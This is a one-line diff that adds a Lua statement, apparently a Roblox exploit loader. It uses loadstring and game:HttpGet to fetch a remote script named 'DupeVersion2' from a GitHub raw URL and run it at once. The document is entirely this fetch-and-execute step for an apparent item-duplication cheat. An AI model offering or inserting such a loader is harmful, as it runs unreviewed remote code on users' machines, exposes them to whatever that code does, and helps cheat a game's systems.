@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShelloX/fictional-octo-disco/main/DupeVersion2"))()
